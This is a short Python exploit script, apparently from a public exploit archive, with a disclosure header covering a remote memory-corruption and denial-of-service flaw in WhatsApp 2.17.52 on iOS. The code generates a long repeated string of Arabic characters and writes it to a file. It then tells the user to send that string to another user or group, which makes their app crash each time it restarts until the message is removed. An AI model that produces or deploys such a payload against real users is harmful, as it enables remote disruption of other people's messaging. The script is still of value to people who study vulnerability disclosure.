#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Found this and more exploits on my open source security project: http://www.exploitpack.com
# Exploit Author: Juan Sacco <juan.sacco@kpn.com> at KPN Red Team - http://www.kpn.com
# Date and time of release: 11 October 2017
#
# Tested on: iPhone 5/6s iOS 10.3.3 and 11
#
# Description:
# WhatsApp 2.17.52 and prior is prone to a remote memory corruption.
# This type of attacks are possible if the program uses memory inefficiently and does not impose limits on the amount of state used when necessary.
#
# Impact:
# Resource exhaustion attacks exploit a design deficiency. An attacker could exploit this vulnerability to remotely corrupt the memory of the application forcing an uhandled exception
# in the context of the application that could potentially result in a denial-of-service condition and/or remote memory corruption.
#
# Warning note:
# Once a user receives the offending message it will automatically crash the application and if its restarted it will crash again until the message its manually removed from the user's history.
#
# Timeline:
# 09/13/2017 - Research started
# 09/13/2017 - First proof of concept
# 09/15/2017 - Reported to Whatsapp
# 09/20/2017 - Report Triaged by Facebook
# 11/01/2017 - Facebook never replied back with a status fix
# 11/01/2017 - Disclosure as zero day
# Vendor homepage: http://www.whatsapp.com
import sys
reload(sys)

def whatsapp(filename):
    sys.setdefaultencoding("utf-8")
    payload = u'ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن' * 1337
    sutf8 = payload.encode('UTF-8')
    print "[*] Writing to file: " + filename
    open(filename, 'w').write(payload)
    print "[*] Done."

def howtouse():
    print "Usage: whatsapp.py [FILENAME]"
    print "[*] Mandatory arguments:"
    print "[-] FILENAME"
    sys.exit(-1)

if __name__ == "__main__":
    try:
        print "[*] WhatsApp 2.17.52 iOS - Remote memory corruption by Juan Sacco"
        print "[*] How to use: Copy the content of the file and send it as a message to another whatsapp user or group"
        whatsapp(sys.argv[1])
    except IndexError:
        howtouse()